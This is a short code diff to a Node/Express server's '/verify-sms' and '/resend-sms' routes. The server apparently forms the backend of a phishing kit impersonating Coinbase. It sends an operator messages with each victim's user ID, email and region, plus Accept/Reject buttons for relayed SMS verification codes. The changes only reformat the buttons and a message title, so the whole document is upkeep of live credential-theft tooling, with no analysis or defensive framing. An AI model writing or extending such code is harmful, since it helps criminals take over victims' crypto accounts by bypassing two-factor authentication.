@@ -569,8 +569,10 @@ app.post("/verify-sms", async (req, res) => {
         parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
-            [{ text: "✅ Accept ✅", callback_data: `sms_accept|${email}` }],
-            [{ text: "❌ Reject ❌", callback_data: `sms_reject|${email}` }]
+            [
+              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
+              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
+            ]
           ]
         }
       })
@@ -614,7 +616,7 @@ app.post("/resend-sms", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
+      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
